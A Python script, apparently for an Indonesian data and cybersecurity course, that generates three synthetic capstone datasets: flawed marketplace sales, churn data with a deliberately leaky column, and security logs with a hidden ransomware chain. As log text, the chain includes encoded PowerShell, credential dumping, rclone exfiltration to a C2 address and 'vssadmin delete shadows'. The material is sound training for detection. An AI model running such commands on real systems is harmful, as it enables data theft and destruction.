"""Membuat dataset capstone Jalur DA, DS, dan Cyber Security (simulasi, seed tetap, hanya pustaka standar).

Pakai:  python alat/buat-data-capstone.py
Hasil:  latihan/capstone-pasarku.csv     (transaksi marketplace Q1 2026, sengaja ada masalah kualitas data)
        latihan/capstone-telkonesia.csv  (pelanggan prabayar + target churn, sengaja ada satu kolom bocor)
        latihan/capstone-insiden-siber.csv (log 3 hari Nusantara Logistik dengan satu rantai serangan tersembunyi)
"""
import csv, math, os, random
from datetime import date, timedelta

AKAR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "latihan")
R = random.Random(20261120)

# ---------------- Pasarku: transaksi marketplace ----------------
KOTA = [("Jakarta", 30), ("Surabaya", 12), ("Bandung", 11), ("Medan", 8), ("Makassar", 6),
        ("Semarang", 8), ("Yogyakarta", 7), ("Denpasar", 5), ("Palembang", 5), ("Balikpapan", 4), ("Manado", 4)]
VARIASI = {"Jakarta": ["DKI Jakarta", "Jkt", "jakarta "], "Surabaya": ["Sby", "surabaya"], "Bandung": ["Bdg", "BANDUNG"],
           "Yogyakarta": ["Jogja", "DI Yogyakarta"]}
KATEGORI = {"Elektronik": (350, 4500, 9), "Fashion": (60, 450, 26), "Rumah Tangga": (40, 600, 20),
            "Kecantikan": (35, 300, 18), "Makanan": (20, 180, 17), "Hobi & Olahraga": (80, 900, 10)}
pengguna = []
for i in range(1, 451):
    kota = R.choices([k for k, _ in KOTA], weights=[w for _, w in KOTA])[0]
    sumber = R.choices(["organik", "iklan", "referral", "afiliasi"], weights=[40, 33, 17, 10])[0]
    daftar = date(2025, 7, 1) + timedelta(days=R.randint(0, 240))
    pengguna.append((i, kota, sumber, daftar, R.uniform(0.6, 1.6)))   # faktor belanja per orang

def bobot_hari(d):
    w = 1.0
    if d.weekday() >= 5: w *= 1.18                      # akhir pekan
    if d.day >= 25 or d.day <= 2: w *= 1.25             # sekitar tanggal gajian
    if date(2026, 3, 1) <= d <= date(2026, 3, 17): w *= 1.45   # menjelang Lebaran
    if date(2026, 3, 19) <= d <= date(2026, 3, 24): w *= 0.6   # libur Lebaran, pengiriman melambat
    return w

baris, tid = [], 500001
d = date(2026, 1, 1)
while d <= date(2026, 3, 31):
    n = int(13 * bobot_hari(d) + R.gauss(0, 2))
    for _ in range(max(4, n)):
        u = R.choice(pengguna)
        if u[3] > d: continue
        kat_bobot = {k: v[2] * (1.8 if k in ("Fashion", "Makanan") and date(2026, 3, 1) <= d <= date(2026, 3, 17) else 1) for k, v in KATEGORI.items()}
        kat = R.choices(list(kat_bobot), weights=list(kat_bobot.values()))[0]
        lo, hi, _ = KATEGORI[kat]
        nilai = int(R.triangular(lo, hi, lo + (hi - lo) * 0.2) * u[4]) * 1000
        kanal = R.choices(["app", "web"], weights=[68, 32])[0]
        status = R.choices(["selesai", "batal", "retur"], weights=[82, 12, 6] if kanal == "app" else [79, 15, 6])[0]
        kota = u[1]
        r = R.random()
        if kota in VARIASI and r < 0.06: kota = R.choice(VARIASI[kota])   # ejaan kota tidak konsisten
        elif r > 0.98: kota = ""                                         # kota kosong
        jam = f"{R.choices(range(24), weights=[1,1,1,1,1,2,4,6,7,7,8,9,10,9,8,8,8,9,10,12,13,12,8,4])[0]:02d}:{R.randint(0,59):02d}"
        ongkir = 0 if nilai >= 200000 and R.random() < 0.6 else R.choice([9000, 12000, 15000, 18000, 22000])
        baris.append([tid, d.isoformat(), jam, u[0], kota, u[2], kat, kanal, nilai, ongkir, status, int(R.random() < 0.35)])
        tid += 1
    d += timedelta(days=1)
# transaksi uji internal bernilai Rp0 dan baris kembar (hasil sinkronisasi ulang)
for _ in range(8):
    baris.append([tid, (date(2026, 1, 1) + timedelta(days=R.randint(0, 89))).isoformat(), "03:1" + str(R.randint(0, 9)), 9999, "Jakarta", "internal", "Elektronik", "web", 0, 0, "selesai", 0]); tid += 1
for b in R.sample(baris, 15): baris.append(list(b))
baris.sort(key=lambda b: (b[1], b[2], b[0]))
with open(os.path.join(AKAR, "capstone-pasarku.csv"), "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["id_transaksi", "tanggal", "jam", "pengguna_id", "kota", "sumber", "kategori", "kanal", "nilai", "ongkir", "status", "voucher"])
    w.writerows(baris)

# ---------------- TelkoNesia: pelanggan prabayar ----------------
WILAYAH = [("Jawa", 55), ("Sumatra", 20), ("Kalimantan", 8), ("Sulawesi", 8), ("Bali-Nusa Tenggara", 5), ("Maluku-Papua", 4)]
tel, churn_n = [], 0
for i in range(1, 3001):
    paket = R.choices(["Hemat", "Reguler", "Super", "Pelajar"], weights=[30, 35, 20, 15])[0]
    wil = R.choices([w for w, _ in WILAYAH], weights=[b for _, b in WILAYAH])[0]
    tenure = max(1, int(R.expovariate(1 / 16)))
    kel = R.choices([0, 1, 2, 3, 4], weights=[52, 25, 12, 7, 4])[0]
    kuota = round(max(0.5, R.gauss({"Hemat": 6, "Reguler": 14, "Super": 30, "Pelajar": 10}[paket], 5)), 1)
    isi = int(max(10, R.gauss({"Hemat": 35, "Reguler": 65, "Super": 120, "Pelajar": 40}[paket], 15))) * 1000
    malam = R.randint(5, 70)
    promo = int(R.random() < 0.4)
    z = -2.1 + 0.55 * kel - 0.045 * min(tenure, 48) + 0.35 * (paket == "Pelajar") + 0.25 * (paket == "Hemat") \
        + 0.4 * (wil in ("Maluku-Papua", "Kalimantan")) - 0.3 * promo + 0.012 * (malam - 35) + R.gauss(0, 0.4)
    churn = int(R.random() < 1 / (1 + math.exp(-z)))
    churn_n += churn
    # kolom bocor: baru diketahui SETELAH periode label (hari tanpa isi ulang di bulan berikutnya)
    bocor = R.randint(25, 31) if churn else min(31, int(R.expovariate(1 / 4)))
    tel.append([f"TN{i:05d}", paket, wil, tenure, kel, kuota, isi, malam, promo, bocor, churn])
with open(os.path.join(AKAR, "capstone-telkonesia.csv"), "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["id_pelanggan", "paket", "wilayah", "bulan_aktif", "keluhan_3bln", "kuota_gb_bln", "isi_ulang_rata",
                "pakai_malam_persen", "pernah_promo", "hari_tanpa_isi_ulang_bln_depan", "churn"])
    w.writerows(tel)

# ---------------- pemeriksaan singkat ----------------
assert len(baris) > 1000 and any(b[8] == 0 for b in baris) and any(b[4] == "" for b in baris)
assert len({tuple(b) for b in baris}) < len(baris), "harus ada baris kembar untuk latihan pembersihan"
rasio = churn_n / len(tel)
assert 0.12 < rasio < 0.35, rasio
print(f"capstone-pasarku.csv: {len(baris)} baris | capstone-telkonesia.csv: {len(tel)} baris, churn {rasio:.1%}")


# ---------------- Nusantara Logistik: log insiden untuk capstone Jalur Cyber Security ----------------
# Tiga hari log gabungan (email, EDR, AD, VPN, web) dengan satu rantai serangan yang disembunyikan di antara
# aktivitas normal. Memakai RNG terpisah supaya dua dataset di atas tidak berubah.
from datetime import datetime
RS = random.Random(20261121)
STAF = {"maya": ("LAP-FIN-07", "Keuangan"), "andi": ("LAP-FIN-03", "Keuangan"), "rudi": ("LAP-OPS-11", "Operasional"),
        "sinta": ("LAP-HR-02", "SDM"), "tono": ("LAP-OPS-05", "Operasional"), "wulan": ("LAP-IT-01", "IT"),
        "fikri": ("LAP-IT-04", "IT"), "ayu": ("LAP-MKT-09", "Pemasaran"), "bagas": ("LAP-OPS-14", "Operasional"), "lina": ("LAP-FIN-12", "Keuangan")}
IP_KANTOR = {u: f"10.20.{RS.randint(1, 4)}.{RS.randint(10, 250)}" for u in STAF}
PROSES_NORMAL = ["chrome.exe", "outlook.exe", "excel.exe", "teams.exe", "explorer.exe", "winword.exe", "acrord32.exe"]
log = []
def catat(t, sumber, host, user, ip, negara, event, status, detail):
    log.append([t.strftime("%Y-%m-%d %H:%M:%S"), sumber, host, user, ip, negara, event, status, detail])
mulai = datetime(2026, 3, 16)
for hari in range(3):
    for u, (host, _) in STAF.items():
        masuk = mulai + timedelta(days=hari, hours=1, minutes=RS.randint(0, 50))      # 08.00–08.50 WIB = 01.00–01.50 UTC
        if RS.random() < 0.15:
            catat(masuk - timedelta(seconds=30), "ad", "DC-01", u, IP_KANTOR[u], "ID", "4625 login gagal", "gagal", "salah ketik password")
        catat(masuk, "ad", "DC-01", u, IP_KANTOR[u], "ID", "4624 login berhasil", "berhasil", "logon type 2 (interaktif)")
        for _ in range(RS.randint(14, 22)):
            t = masuk + timedelta(minutes=RS.randint(5, 540))
            catat(t, "edr", host, u, IP_KANTOR[u], "ID", "proses dijalankan", "info", RS.choice(PROSES_NORMAL))
        for _ in range(RS.randint(3, 6)):
            t = masuk + timedelta(minutes=RS.randint(5, 540))
            catat(t, "email", "MAIL-GW", u, "-", "-", "email diterima", "lolos", RS.choice(["rapat mingguan", "laporan pengiriman", "jadwal armada", "pengumuman HR", "invoice vendor resmi"]))
        if RS.random() < 0.35:
            t = mulai + timedelta(days=hari, hours=RS.randint(11, 14), minutes=RS.randint(0, 59))
            catat(t, "vpn", "VPN-GW", u, f"114.{RS.randint(120, 125)}.{RS.randint(0, 255)}.{RS.randint(1, 254)}", "ID", "login VPN", "berhasil", "bekerja dari rumah")
    for _ in range(RS.randint(110, 140)):                                          # lalu lintas web publik
        t = mulai + timedelta(days=hari, seconds=RS.randint(0, 86399))
        ip = f"{RS.choice([36, 110, 112, 114, 182])}.{RS.randint(0, 255)}.{RS.randint(0, 255)}.{RS.randint(1, 254)}"
        path = RS.choice(["/", "/lacak?resi=NL" + str(RS.randint(100000, 999999)), "/tarif", "/kontak", "/karier", "/login"])
        catat(t, "web", "WEB-01", "-", ip, "ID", "GET " + path, "200", "normal")
    for _ in range(RS.randint(4, 8)):                                               # alarm palsu: pemindai otomatis internet
        t = mulai + timedelta(days=hari, seconds=RS.randint(0, 86399))
        catat(t, "web", "WEB-01", "-", f"198.51.100.{RS.randint(1, 254)}", "US",
              "GET " + RS.choice(["/.env", "/wp-login.php", "/phpmyadmin", "/.git/config"]), "404", "pemindai otomatis")
C2, H = "203.0.113.200", mulai   # alamat dokumentasi (RFC 5737), bukan IP sungguhan                                                     # rantai serangan (UTC)
serangan = [
    (H + timedelta(hours=2, minutes=12), "email", "MAIL-GW", "maya", "-", "-", "email diterima", "lolos", "dari tagihan@nusantara-logistik.example | lampiran Invoice_Maret.zip"),
    (H + timedelta(hours=2, minutes=40), "edr", "LAP-FIN-07", "maya", IP_KANTOR["maya"], "ID", "proses dijalankan", "info", "Invoice_Maret.exe (dari folder Downloads)"),
    (H + timedelta(hours=2, minutes=40, seconds=20), "edr", "LAP-FIN-07", "maya", IP_KANTOR["maya"], "ID", "proses dijalankan", "peringatan", "powershell.exe -enc JABjAD0A... (induk: Invoice_Maret.exe)"),
    (H + timedelta(hours=2, minutes=41), "edr", "LAP-FIN-07", "maya", IP_KANTOR["maya"], "ID", "koneksi keluar", "info", f"{C2}:443 (pertama kali terlihat)"),
    (H + timedelta(hours=2, minutes=55), "edr", "LAP-FIN-07", "maya", IP_KANTOR["maya"], "ID", "akses memori lsass.exe", "peringatan", "pembacaan memori proses kredensial"),
]
for i in range(9):
    serangan.append((H + timedelta(hours=3, minutes=5, seconds=i * 20), "ad", "DC-01", "svc_backup", IP_KANTOR["maya"], "ID", "4625 login gagal", "gagal", "logon type 3 (jaringan) dari LAP-FIN-07"))
serangan += [
    (H + timedelta(hours=3, minutes=8, seconds=30), "ad", "DC-01", "svc_backup", IP_KANTOR["maya"], "ID", "4624 login berhasil", "berhasil", "logon type 3 dari LAP-FIN-07"),
    (H + timedelta(hours=16, minutes=30), "vpn", "VPN-GW", "maya", C2, "NL", "login VPN", "berhasil", "di luar jam kerja, tanpa MFA; IP internal diberikan 10.20.9.9"),
    (H + timedelta(days=1, hours=1, minutes=10) - timedelta(hours=1), "ad", "DC-01", "svc_backup", "10.20.9.9", "ID", "4720 akun dibuat", "berhasil", "akun baru: helpdesk2"),
    (H + timedelta(days=1, hours=0, minutes=12), "ad", "DC-01", "svc_backup", "10.20.9.9", "ID", "4728 anggota grup ditambah", "berhasil", "helpdesk2 → Domain Admins"),
    (H + timedelta(days=1, hours=0, minutes=30), "edr", "FS-01", "helpdesk2", "10.20.9.9", "ID", "proses dijalankan", "peringatan", "rclone.exe copy D:\\Arsip remote:nl-backup"),
    (H + timedelta(days=1, hours=0, minutes=31), "edr", "FS-01", "helpdesk2", "10.20.9.9", "ID", "koneksi keluar", "info", f"{C2}:443 terkirim 4,2 GB"),
    (H + timedelta(days=1, hours=1, minutes=58), "edr", "FS-01", "helpdesk2", "10.20.9.9", "ID", "proses dijalankan", "peringatan", "vssadmin.exe delete shadows /all /quiet"),
]
for i in range(12):
    serangan.append((H + timedelta(days=1, hours=2, minutes=1 + i), "edr", "FS-01", "helpdesk2", "10.20.9.9", "ID", "file diubah massal", "kritis",
                     f"{RS.randint(800, 2400)} file berganti ekstensi .locked"))
serangan.append((H + timedelta(days=1, hours=2, minutes=14), "edr", "FS-01", "helpdesk2", "10.20.9.9", "ID", "file dibuat", "kritis", "BACA_INI_UNTUK_DEKRIPSI.txt"))
for s in serangan: catat(*s)
log.sort(key=lambda b: b[0])
with open(os.path.join(AKAR, "capstone-insiden-siber.csv"), "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["waktu_utc", "sumber", "host", "pengguna", "ip", "negara", "kejadian", "status", "detail"])
    w.writerows(log)
assert sum(1 for b in log if b[7] == "kritis") == 13 and any("helpdesk2 → Domain Admins" in b[8] for b in log)
print(f"capstone-insiden-siber.csv: {len(log)} baris, {len(serangan)} baris rantai serangan")
